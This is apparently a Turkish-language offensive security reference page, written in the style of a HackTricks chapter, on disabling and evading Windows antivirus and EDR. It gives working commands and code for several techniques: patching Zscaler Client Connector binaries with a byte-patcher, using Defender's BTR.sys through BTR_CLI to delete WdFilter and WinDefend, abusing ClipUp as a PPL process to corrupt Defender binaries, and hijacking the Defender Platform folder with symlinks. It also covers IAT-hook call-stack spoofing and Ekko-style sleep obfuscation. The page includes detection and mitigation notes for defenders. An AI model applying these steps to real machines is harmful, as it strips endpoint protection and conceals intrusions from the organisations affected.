4. **Neden işe yarıyor**: BYOVD, user-mode korumalarını tamamen atlar; kernel’de çalışan kod, PPL/PP, ELAM veya diğer güçlendirme özelliklerinden bağımsız olarak *korumalı* süreçleri açabilir, sonlandırabilir ya da kernel nesnelerini kurcalayabilir.

Tespit / Azaltma
• Windows’un `AToolsKrnl64.sys` dosyasını yüklemeyi reddetmesi için Microsoft’un güvenlik açığı bulunan sürücü engelleme listesini (`HVCI`, `Smart App Control`) etkinleştirin.
• Yeni *kernel* hizmetlerinin oluşturulmasını izleyin ve herkes tarafından yazılabilir bir dizinden yüklenen veya izin verilenler listesinde bulunmayan bir sürücü olduğunda uyarı verin.
• Özel cihaz nesnelerine yönelik user-mode tanıtıcılarını ve ardından gelen şüpheli `DeviceIoControl` çağrılarını izleyin.

### Disk Üzerindeki İkili Dosyaları Yamayarak Zscaler Client Connector Duruş Denetimlerini Atlatma

Zscaler’ın **Client Connector**’ı cihaz duruşu kurallarını yerel olarak uygular ve sonuçları diğer bileşenlere iletmek için Windows RPC’ye güvenir. Tasarımdaki iki zayıf tercih, tam bir atlatmayı mümkün kılar:

1. Duruş değerlendirmesi **tamamen istemci tarafında** yapılır (sunucuya bir boolean gönderilir).
2. Dahili RPC uç noktaları yalnızca bağlanan çalıştırılabilir dosyanın **Zscaler tarafından imzalandığını** (`WinVerifyTrust` aracılığıyla) doğrular.<sup>[[11]](#references)</sup>

**Disk üzerindeki dört imzalı ikili dosya yamalanarak** her iki mekanizma da etkisiz hâle getirilebilir:

| İkili dosya | Yamalanan özgün mantık | Sonuç |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Her zaman `1` döndürür; böylece her denetim uyumlu kabul edilir |
| `ZSAService.exe` | `WinVerifyTrust` için dolaylı çağrı | NOP-ed ⇒ herhangi bir süreç (imzasız olanlar dâhil) RPC pipe’larına bağlanabilir |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` ile değiştirilir |
| `ZSATunnel.exe` | Tüneldeki bütünlük denetimleri | Kısa devre edilir |

Minimal patcher alıntısı:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Orijinal dosyaları değiştirdikten ve servis yığınını yeniden başlattıktan sonra:

* **Tüm** duruş kontrolleri **yeşil/uyumlu** görünür.
* İmzasız veya değiştirilmiş ikili dosyalar, adlandırılmış pipe RPC uç noktalarını açabilir (örn. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ele geçirilmiş ana bilgisayar, Zscaler politikalarıyla tanımlanan iç ağa kısıtlamasız erişim kazanır.

Bu vaka çalışması, tamamen istemci tarafındaki güven kararlarının ve basit imza kontrollerinin birkaç baytlık yamayla nasıl aşılabileceğini gösterir.

## Microsoft Defender `BTR.sys` güvenilir işlevselliğinin kötüye kullanımı

Defender'ın **Boot-Time Removal** sürücüsü, klasik BYOVD'ye yararlı bir karşı örnektir. `BTR.sys`, bellek bozulması hatası ve IOCTL arayüzü olmayan, Microsoft tarafından imzalanmış meşru bir düzeltme bileşenidir; yönetici erişimi ve `SeLoadDriverPrivilege` elde ettikten sonra bir operatör, bunun yerine özel düzeltme işlemini taklit ederek amaçlanan Ring-0 dosya/kayıt defteri işlemlerini gerçekleştirebilir. Bu, **ilk erişim veya ayrıcalık yükseltme değil, ihlal sonrası AV/EDR etkisizleştirme aracıdır** ve sürücü, dikkat çekici bir üçüncü taraf sürücüyü içe aktarmak yerine hedefin kendi `MpEngine.dll` dosyasındaki `BOOTTIMETOOL` kaynağından çıkarılabilir.<sup>[[36]](#references)</sup>

### Tek seferlik sürücünün hazırlanması

Defender normalde kaynağı rastgele bir `[a-z]{8}.sys` dosyası olarak bırakır ve benzer ad taşıyan bir kernel servisi kaydeder. `DriverEntry`, servisin `Args` değerini okur, başvurulan NTFS ADS'yi açar, eylem listesinin şifresini çözer ve doğrular, geri bildirim yazar ve başarılı yürütmenin ardından `0xC0000056` (`STATUS_DELETE_PENDING`) döndürerek sürücünün bellekte kalmak yerine yükünün kaldırılmasını sağlar. Taklit edilmiş bir servis aşağıdaki karakteristik değerlere sahiptir.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

`:changelist` stream'i, RC4 ile şifrelenmiş tek bir blob içerir. İncelenen build'ler sabit 256 baytlık bir anahtarı yeniden kullandığından, şifreleme bir yetkilendirme sınırı değildir. Geçerli bir plaintext; 24 baytlık genel bir başlık (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, başlık CRC'si ve payload'dan türetilmiş bir işlem kimliği), ardından null ile sonlandırılmış bir UTF-16 feedback path ve istenen sayıda öğeden oluşur. Her öğe, eyleme özgü verilerin izlediği 16 baytlık bir başlığa (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) sahiptir ve bu veriler **tam olarak dört NUL baytıyla** sonlanır. Her başlık/veri bölgesi; polinom `0xEDB88320`, başlangıç durumu `0xFFFFFFFF` ve **son XOR uygulanmadan** (`~CRC32`) CRC-32 ile bağımsız olarak doğrulanır; CRC durumu her bölge için sıfırlanır.<sup>[[36]](#references)[[37]](#references)</sup>

Kabul edilen eylem kimlikleri, bu kernel primitive'lerini kullanıma açar.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Item data | Sonuç |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Kilitli bir dosya da dahil olmak üzere dosyayı siler |
| 2 | `[UTF-16 path]` | Boş bir dizini kaldırır |
| 3 | `[Flags][source][destination]` | Dosyayı saldırganın seçtiği korumalı bir yola taşır; boş bir hedef, silme anlamına gelir |
| 4 | `[Flags][key path]` | Bir registry key'i özyinelemeli olarak siler |
| 5 | `[Flags][key path + "\\" + value]` | Bir registry value'yu siler |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Bir registry value oluşturur/günceller ve eksik key yollarını oluşturur |

Eylem 5 ve 6 için, kablodaki key/value ayırıcısı **art arda gelen iki ters eğik çizgidir**; alışılagelmiş biçimde yazılmış bir yol doğru şekilde ayrıştırılmaz. Feedback file çoğunlukla isteği yansıtır, ancak her öğenin ilk dört veri baytı, sonuçtaki `NTSTATUS` değerine dönüşür. Baştaki flags alanı olmayan 1 ve 2 numaralı eylemlerde BTR, bu status için yer açmak amacıyla yolu ayrılmış son dört bayta kaydırır.<sup>[[36]](#references)</sup>

### `BTR_CLI` iş akışı ve erken önyükleme aralığı

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) zincirin tamamını uygular: `BTR.sys` dosyasını yerel Defender'dan çıkarır, `<random>.sys:changelist` ve bir feedback stream oluşturur, zincirlenmiş eylemleri serileştirir/kontrol toplamlarını hesaplar/şifreler, service registry key'ini doğrudan oluşturur ve ardından `-trigger now` için `NtLoadDriver` çağrısı yapar veya `-trigger boot` için sürücüyü system-start olarak bırakır. Registry'yi doğrudan hazırlamak, normal SCM `CreateServiceW` yolunu atlar ve bu nedenle service kurulum Event ID 7045'i **oluşturmaz**. Boot-triggered yapılar daha sonra `BTR_CLI.exe -cleanup <service_name>` ile kaldırılabilir.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` kullanılamaz; çünkü BTR, depolama yığını ve `SystemRoot` bağlantısı hazır olmadan `DriverEntry` içinden dosya G/Ç işlemleri gerçekleştirir. `Start=1` ve yüksek öncelikli `Boot Bus Extender` grubu ise Phase 1'de çalışır: NTFS kullanılabilir durumdadır, ancak sistem başlangıcında çalışan birçok güvenlik sürücüsü ve user-mode EDR hizmeti henüz başlatılmamıştır. `WdFilter` gibi boot-start filtreleri zaten yüklenmiş olabilir; ancak BTR bir sonraki başlangıçtan önce bunların ikili dosyalarını veya hizmet yapılandırmasını kaldırabilir ve SCM bunları başlatmadan önce hizmet yürütülebilir dosyalarını silebilir. BTR, boot-start değerlendirmesinden sonra çalıştığı ve geçerli bir Microsoft imzası taşıdığı için ELAM bu açığı kapatmaz.<sup>[[36]](#references)</sup>

Birden fazla eylem tek bir işlemde yürütülür. PoC, sabit kodlanmış `\SystemRoot\Temp\BootClean.log` için Action 1'i başa ekler: BTR bu günlüğü oluşturur, ardından kendi silme isteğini işler ve sürücü kaldırılmadan önce günlüğü siler. Bu, geride kalan kanıtı azaltır; geri bildirimin `<random>.sys:<random>.dat` içine yazılması ise sürücüyle her iki akışın da birlikte kaldırılmasını sağlar.<sup>[[36]](#references)[[37]](#references)</sup>

### Yüksek sinyalli tespit korelasyonları

Yalnızca imzaya dayalı kurallar ve Microsoft'un savunmasız sürücü engelleme listesi, BTR'nin amaçlanan işlevlerinin kötüye kullanılmasını önlemez. Meşru Defender kökenli kullanımı gelişigüzel bir başlatıcıdan ayırt ederken bu davranışsal korelasyonları tercih edin.<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist` oluşturulması, BTR hazırlama işlemlerinin tamamında görülür. Aynı `.sys` dosyasına eklenen bir `.dat` ADS, özellikle şüphelidir; çünkü meşru Defender genellikle geri bildirim verilerini `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` altına yazar.
- **System 7045 olmadan Sysmon 12/13:** `Args=...:changelist` ve `Group=Boot Bus Extender` içeren `HKLM\SYSTEM\CurrentControlSet\Services\<random>` kayıtlarının doğrudan oluşturulmasını, eşleşen bir SCM yükleme olayı olmamasıyla ilişkilendirin.
- **Sysmon 6 -> 23:** Defender dışı bilinen bir kökenden BTR sürücüsünün yüklenmesini ve ardından `System`/PID 4'e atfedilen dosya silme işlemlerini, özellikle güvenlik ikili dosyaları için, ilişkilendirin.
- **Sysmon 11 -> 23:** `System`/PID 4 tarafından `\SystemRoot\Temp\BootClean.log` dosyasının hızla oluşturulup silinmesi durumunda uyarı verin.
- `SeLoadDriverPrivilege` atamasını/etkinleştirilmesini kısıtlayın ve denetleyin; bir güvenlik aracı sürücüsü `cmd.exe`, PowerShell veya bilinmeyen bir işlem tarafından hazırlanıyorsa tek başına Microsoft imzası yeterli güvence değildir.

## LOLBIN'lerle AV/EDR'ye Müdahale Etmek İçin Protected Process Light (PPL) Kötüye Kullanımı

Protected Process Light (PPL), korumalı işlemlerin birbirine müdahale etmesini yalnızca eşit veya daha yüksek koruma düzeyindeki işlemlere izin veren bir imzalayan/düzey hiyerarşisi uygular. Saldırgan açısından, PPL etkin bir ikili dosyayı meşru şekilde başlatabiliyor ve argümanlarını denetleyebiliyorsanız, günlük tutma gibi zararsız bir işlevi AV/EDR tarafından kullanılan korumalı dizinlere yazma olanağı sağlayan, kısıtlı ve PPL destekli bir ilkel işleme dönüştürebilirsiniz.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Bir işlemin PPL olarak çalışmasını sağlayanlar
- Hedef EXE (ve yüklenen tüm DLL'ler) PPL destekli bir EKU ile imzalanmış olmalıdır.
- İşlem, şu bayraklarla `CreateProcess` kullanılarak oluşturulmalıdır: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- İkili dosyanın imzalayanıyla eşleşen uyumlu bir koruma düzeyi istenmelidir (ör. kötü amaçlı yazılımlara karşı koruma imzalayanları için `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows imzalayanları için `PROTECTION_LEVEL_WINDOWS`). Yanlış düzeyler oluşturma işleminin başarısız olmasına neden olur.

PP/PPL ve LSASS korumasına daha geniş bir giriş için ayrıca bkz.:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Başlatıcı araçları
- Açık kaynaklı yardımcı: CreateProcessAsPPL (koruma düzeyini seçer ve argümanları hedef EXE'ye iletir):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Kullanım örüntüsü:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- İmzalı sistem ikilisi `C:\Windows\System32\ClipUp.exe` kendi kendini başlatır ve çağıranın belirttiği bir yola günlük dosyası yazmak için parametre kabul eder.
- PPL süreci olarak başlatıldığında dosya yazma işlemi PPL koruması altında gerçekleşir.
- ClipUp, boşluk içeren yolları ayrıştıramaz; normalde korunan konumları belirtmek için 8.3 kısa yollarını kullanın.

8.3 kısa yol yardımcıları
- Kısa adları listeleyin: Her üst dizinde `dir /x` çalıştırın.
- cmd'de kısa yolu belirleyin: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (soyut)
1) PPL destekli LOLBIN'i (ClipUp) bir başlatıcı (ör. CreateProcessAsPPL) kullanarak `CREATE_PROTECTED_PROCESS` ile başlatın.
2) Korumalı bir AV dizininde (ör. Defender Platform) dosya oluşturmayı zorlamak için ClipUp'ın günlük yolu parametresini iletin. Gerekirse 8.3 kısa adlarını kullanın.
3) Hedef ikili normalde AV tarafından çalışırken açık/kilitli tutuluyorsa (ör. MsMpEng.exe), AV başlamadan önce yazma işlemini gerçekleştirmek için daha erken çalıştığından emin olunan bir otomatik başlatma hizmeti yükleyerek işlemi açılışta planlayın. Process Monitor (boot logging) ile açılış sırasını doğrulayın.
4) Yeniden başlatıldığında, PPL koruması altındaki yazma işlemi AV ikililerini kilitlemeden önce gerçekleşir; hedef dosyayı bozarak AV'nin başlamasını engeller.

Örnek çağrı (yollar güvenlik amacıyla gizlenmiş/kısaltılmış):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Notlar ve kısıtlamalar
- ClipUp'ın yazdığı içeriği, nereye yazacağını belirlemek dışında kontrol edemezsiniz; bu yöntem hassas içerik eklemekten ziyade bozulmaya yol açmaya uygundur.
- Bir hizmeti yüklemek/başlatmak ve yeniden başlatma penceresi için yerel yönetici/SYSTEM yetkisi gerekir.
- Zamanlama kritik önem taşır: hedef açık olmamalıdır; önyükleme sırasında çalıştırmak dosya kilitlerini önler.

Tespit
- Özellikle standart olmayan başlatıcıların alt süreci olarak, önyükleme civarında olağan dışı bağımsız değişkenlerle başlatılan `ClipUp.exe` süreçleri.
- Şüpheli ikili dosyaları otomatik başlatacak şekilde yapılandırılmış yeni hizmetler ve Defender/AV'den önce tutarlı biçimde başlatılmaları. Defender başlatma hatalarından önceki hizmet oluşturma/değiştirme işlemlerini inceleyin.
- Defender ikili dosyalarında/Platform dizinlerinde dosya bütünlüğü izleme; korumalı süreç bayraklarına sahip süreçlerin beklenmedik dosya oluşturma/değiştirme işlemleri.
- ETW/EDR telemetrisi: `CREATE_PROTECTED_PROCESS` ile oluşturulan süreçleri ve AV dışı ikili dosyaların olağan dışı PPL düzeyi kullanımını araştırın.

Azaltma
- WDAC/Code Integrity: PPL olarak hangi imzalı ikili dosyaların ve hangi üst süreçler altında çalışabileceğini kısıtlayın; ClipUp'ın meşru bağlamlar dışında çalıştırılmasını engelleyin.
- Hizmet hijyeni: otomatik başlatılan hizmetlerin oluşturulmasını/değiştirilmesini kısıtlayın ve başlatma sırası manipülasyonunu izleyin.
- Defender tamper protection ve erken başlatma korumalarının etkin olduğundan emin olun; ikili dosya bozulmasına işaret eden başlatma hatalarını inceleyin.
- Ortamınızla uyumluysa, güvenlik araçlarının bulunduğu birimlerde 8.3 kısa ad oluşturmayı devre dışı bırakmayı değerlendirin (iyice test edin).

## Platform Version Folder Symlink Hijack ile Microsoft Defender'ı kurcalama

Windows Defender, çalışacağı platformu şu dizinin alt klasörlerini numaralandırarak seçer:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Söz dizimsel olarak en yüksek sürüm dizgesine sahip alt klasörü (ör. `4.18.25070.5-0`) seçer, ardından Defender hizmeti süreçlerini buradan başlatır (hizmet/kayıt defteri yollarını buna göre günceller). Bu seçim, dizin sembolik bağlantıları da dahil olmak üzere dizin girdilerine güvenir. Yönetici, Defender'ı saldırganın yazabildiği bir yola yönlendirmek ve DLL sideloading veya hizmet kesintisi sağlamak için bundan yararlanabilir.<sup>[[21]](#references)[[22]](#references)</sup>

Ön koşullar
- Yerel Administrator (Platform klasörü altında dizin/sembolik bağlantı oluşturmak için gerekir)
- Yeniden başlatma veya Defender platformunun yeniden seçilmesini tetikleme olanağı (önyüklemede hizmetin yeniden başlatılması)
- Yalnızca yerleşik araçlar gerekir (`mklink`)

Neden işe yarar
- Defender kendi klasörlerine yazılmasını engeller; ancak platform seçimi dizin girdilerine güvenir ve hedefin korumalı/güvenilir bir yola çözümlendiğini doğrulamadan söz dizimsel olarak en yüksek sürümü seçer.

Adım adım (örnek)
1) Mevcut platform klasörünün yazılabilir bir kopyasını hazırlayın; ör. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform içinde klasörünüze işaret eden, daha yüksek sürüm numarasına sahip bir dizin symlink'i oluşturun:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Tetikleyici seçimi (yeniden başlatma önerilir):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend)'in yönlendirilmiş yoldan çalıştığını doğrulayın:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Yeni process yolunun `C:\TMP\AV\` altında olduğunu ve service yapılandırmasının/registry’nin bu konumu yansıttığını görmelisiniz.

Post-exploitation seçenekleri
- DLL sideloading/code execution: Defender’ın uygulama dizininden yüklediği DLL’leri bırakın/değiştirin ve Defender’ın process’lerinde kod çalıştırın. Üstteki bölüme bakın: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Version-symlink’i kaldırın; böylece sonraki başlatmada yapılandırılmış yol çözümlenmez ve Defender başlatılamaz:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Bu tekniğin tek başına ayrıcalık yükseltme sağlamadığını; yönetici hakları gerektirdiğini unutmayın.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red team'ler, runtime evasion işlemlerini C2 implantından çıkarıp hedef modülün içine taşıyabilir. Bunun için modülün Import Address Table'ını (IAT) hook'layıp seçili API'leri saldırganın denetimindeki position-independent code (PIC) üzerinden yönlendirirler. Bu yaklaşım, evasion'ı birçok kitin sunduğu sınırlı API yüzeyinin (ör. CreateProcessA) ötesine taşır ve aynı korumaları BOF'lara ve post-exploitation DLL'lerine de uygular.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Üst düzey yaklaşım
- Reflective loader kullanarak hedef modülün yanına bir PIC blob'u yerleştirin (başına eklenmiş veya eşlik eden). PIC kendi kendine yeterli ve position-independent olmalıdır.
- Host DLL yüklenirken IMAGE_IMPORT_DESCRIPTOR üzerinde gezinip hedeflenen import'ların (ör. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) IAT girdilerini ince PIC wrapper'larına yönlendirin.
- Her PIC wrapper, gerçek API adresine tail-call yapmadan önce evasion işlemlerini yürütür. Yaygın evasion işlemleri şunlardır:
  - Çağrı öncesinde belleği maskeleme/maskeyi kaldırma (ör. beacon bölgelerini şifreleme, RWX→RX, sayfa adlarını/izinlerini değiştirme) ve çağrı sonrasında geri yükleme.
  - Call-stack spoofing: zararsız görünen bir stack oluşturup hedef API'ye geçiş yaparak call-stack analizinin beklenen frame'leri çözümlemesini sağlama.<sup>[[9]](#references)</sup>
- Uyumluluk için bir arayüz dışa aktararak Aggressor script'in (veya eşdeğerinin) Beacon, BOF'lar ve post-ex DLL'ler için hangi API'lerin hook'lanacağını kaydetmesini sağlayın.

Burada IAT hooking neden kullanılıyor?
- Hook'lanan import'u kullanan tüm kodlarda çalışır; araç kodunu değiştirmeyi veya belirli API'leri proxy'lemesi için Beacon'a güvenmeyi gerektirmez.
- Post-ex DLL'leri kapsar: LoadLibrary*'ı hook'lamak, modül yüklemelerini (ör. System.Management.Automation.dll, clr.dll) yakalamanıza ve bu modüllerin API çağrılarına aynı maskeleme/stack evasion işlemlerini uygulamanıza olanak tanır.
- CreateProcessA/W'yi wrapper üzerinden çağırarak call-stack tabanlı tespitlere karşı process-spawning post-ex komutlarının güvenilir biçimde kullanılmasını sağlar.

Minimal IAT hook taslağı (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notlar
- Yamayı relocations/ASLR sonrasında ve import ilk kez kullanılmadan önce uygulayın. TitanLdr/AceLdr gibi Reflective loader’lar, yüklenen modülün DllMain’i sırasında hooking yapılabildiğini gösterir.
- Wrapper’ları küçük ve PIC-safe tutun; gerçek API’yi yamadan önce kaydettiğiniz özgün IAT değerinden veya LdrGetProcedureAddress aracılığıyla çözümleyin.
- PIC için RW → RX geçişleri kullanın ve writable+executable sayfalar bırakmayın.

Call‑stack spoofing stub
- Draugr tarzı PIC stub’ları sahte bir çağrı zinciri oluşturur (benign modüllerdeki dönüş adresleriyle), ardından gerçek API’ye geçiş yapar.
- Bu, Beacon/BOF’lardan hassas API’lere giden canonical stack’leri bekleyen tespitleri etkisiz kılar.
- API prologue’una girmeden önce beklenen frame’lerin içine yerleşmek için stack cutting/stack stitching teknikleriyle birlikte kullanın.

Operasyonel entegrasyon
- PIC ve hook’ların DLL yüklendiğinde otomatik olarak başlatılması için reflective loader’ı post-ex DLL’lerin başına ekleyin.
- Beacon ve BOF’ların kod değişikliği olmadan aynı evasion yolundan şeffaf biçimde yararlanması için hedef API’leri kaydeden bir Aggressor script kullanın.

Tespit/DFIR değerlendirmeleri
- IAT bütünlüğü: image dışındaki (heap/anon) adreslere çözümlenen girişler; import pointer’larının periyodik olarak doğrulanması.
- Stack anomalileri: yüklü image’lara ait olmayan dönüş adresleri; image dışındaki PIC’e ani geçişler; tutarsız RtlUserThreadStart soy ağacı.
- Loader telemetrisi: süreç içinden IAT’ye yazma; import thunk’larını değiştiren erken DllMain etkinliği; yükleme sırasında beklenmedik RX bölgelerinin oluşturulması.
- Image-load evasion: LoadLibrary* hook’lanmışsa bellek maskeleme olaylarıyla ilişkili şüpheli automation/clr assembly yüklemelerini izleyin.

İlgili yapı taşları ve örnekler
- Yükleme sırasında IAT patching yapan reflective loader’lar (örn. TitanLdr, AceLdr)
- Memory masking hook’ları (örn. simplehook) ve stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stub’ları (örn. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Yerleşik bir PICO aracılığıyla import-time IAT hook’ları

Bir reflective loader’ı kontrol ediyorsanız, `ProcessImports()` sırasında loader’ın `GetProcAddress` pointer’ını önce hook’ları kontrol eden özel bir resolver ile değiştirerek import’ları hook’layabilirsiniz:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Geçici loader PIC kendini serbest bıraktıktan sonra da varlığını sürdüren **yerleşik bir PICO** (persistent PIC object) oluşturun.
- Loader’ın import resolver’ını üzerine yazan bir `setup_hooks()` işlevini dışa aktarın (örn. `funcs.GetProcAddress = _GetProcAddress`).
- `_GetProcAddress` içinde ordinal import’ları atlayın ve `__resolve_hook(ror13hash(name))` gibi hash tabanlı bir hook araması kullanın. Hook varsa onu döndürün; yoksa gerçek `GetProcAddress` işlevine yönlendirin.
- Hook hedeflerini derleme zamanında Crystal Palace `addhook "MODULE$Func" "hook"` girdileriyle kaydedin. Hook, yerleşik PICO’nun içinde bulunduğundan geçerliliğini korur.

Böylece yüklenen DLL’in code section’ını yükleme sonrasında patch’lemeden **import-time IAT yönlendirmesi** yapılır.

### Hedef PEB-walking kullandığında hook’lanabilir import’ları zorlama

Import-time hook’lar yalnızca işlev hedefin IAT’sinde gerçekten bulunuyorsa devreye girer. Bir modül API’leri PEB-walk + hash aracılığıyla çözümlüyorsa (import girdisi yoksa), loader’ın `ProcessImports()` yolunda bu işlevi görmesi için gerçek bir import ekleyin:

- Hash’lenmiş export çözümlemesini (örn. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) `&WaitForSingleObject` gibi doğrudan bir referansla değiştirin.
- Derleyici bir IAT girdisi üretir; böylece reflective loader import’ları çözümlerken araya girilebilir.

### `Sleep()` patch’lemeden Ekko tarzı uyku/boşta kalma obfuscation’ı

`Sleep`’i patch’lemek yerine, implantın kullandığı **gerçek wait/IPC primitive’lerini** (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`) hook’layın. Uzun beklemelerde çağrıyı, boşta kalma sırasında bellekteki image’ı şifreleyen Ekko tarzı bir obfuscation zincirine sarın:<sup>[[31]](#references)[[27]](#references)</sup>

- `NtContinue` işlevini hazırlanmış `CONTEXT` frame’leriyle çağıran bir callback dizisi zamanlamak için `CreateTimerQueueTimer` kullanın.
- Tipik zincir (x64): image’ı `PAGE_READWRITE` yapın → eşlenmiş image’ın tamamında `advapi32!SystemFunction032` ile RC4 şifrelemesi uygulayın → blocking wait gerçekleştirin → RC4 ile şifrelemeyi çözün → PE section’larını dolaşarak **section başına izinleri geri yükleyin** → tamamlandığını bildirin.
- `RtlCaptureContext` bir `CONTEXT` şablonu sağlar; bunu birden fazla frame’e kopyalayıp her adımı çağırmak için register’ları (`Rip/Rcx/Rdx/R8/R9`) ayarlayın.

Operasyonel ayrıntı: Uzun beklemelerde (örn. `WAIT_OBJECT_0`) “success” döndürün; böylece image maskelenmişken çağıran kod devam eder. Bu yöntem, boşta kalınan aralıklarda modülü scanner’lardan gizler ve klasik “patched `Sleep()`” imzasından kaçınır.

Tespit fikirleri (telemetri tabanlı)
- `NtContinue` işaret eden `CreateTimerQueueTimer` callback’lerinin kümelenmesi.
- Büyük ve bitişik, image boyutundaki buffer’larda `advapi32!SystemFunction032` kullanılması.
- Geniş aralıklı `VirtualProtect` çağrısının ardından özel section başına izinlerin geri yüklenmesi.

### Sleep-obfuscation gadget’ları için runtime CFG kaydı

CFG etkin hedeflerde `jmp [rbx]` veya `jmp rdi` gibi bir mid-function gadget’a yapılan ilk indirect jump genellikle gadget modülün CFG metadata’sında bulunmadığı için süreci `STATUS_STACK_BUFFER_OVERRUN` ile çökertir. Ekko/Kraken tarzı zincirlerin güçlendirilmiş süreçlerde çalışmasını sağlamak için:<sup>[[30]](#references)</sup>

- Zincirin kullandığı her indirect destination’ı `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` ve `CFG_CALL_TARGET_VALID` girdileriyle kaydedin.
- Yüklü image’lardaki adresler için (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` **image base**’ten başlamalı ve **image’ın tamamının boyutunu** kapsamalıdır.
- Manually mapped/PIC/stomped bölgeler için bunun yerine **allocation base** ve allocation size kullanın.
- Yalnızca dispatch gadget’ını değil, indirect olarak ulaşılan export’ları da (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) ve indirect target olacak saldırgan denetimindeki tüm executable section’ları işaretleyin.

Bu, ROP/JOP tarzı sleep zincirlerini “yalnızca CFG olmayan süreçlerde çalışır” durumundan `explorer.exe`, tarayıcılar, `svchost.exe` ve `/guard:cf` ile derlenmiş diğer endpoint’lerde kullanılabilir bir primitive’e dönüştürür.

### Uyuyan thread’ler için CET-safe stack spoofing

Tam `CONTEXT` değiştirmek gürültülüdür ve CET Shadow Stack sistemlerinde sorun çıkarabilir; çünkü spoof edilmiş bir `Rip`, donanım shadow stack’iyle hâlâ eşleşmelidir. Uyku sırasında maskeleme için daha güvenli bir yöntem:<sup>[[30]](#references)</sup>

- Aynı süreçteki başka bir thread’i seçin ve `NtQueryInformationThread` aracılığıyla `NT_TIB` / TEB stack sınırlarını (`StackBase`, `StackLimit`) okuyun.
- Mevcut thread’in gerçek TEB/TIB bilgisini yedekleyin.
- `GetThreadContext` ile gerçekten uyuyan thread’in context’ini yakalayın.
- Spoof context’ine **yalnızca** gerçek `Rip` değerini kopyalayın; spoof edilmiş `Rsp`/stack durumunu olduğu gibi bırakın.
- Uyku aralığında, stack walker’ların geçerli bir stack aralığının içinde unwind etmesi için spoof thread’in `NT_TIB` bilgisini mevcut TEB’ye kopyalayın.
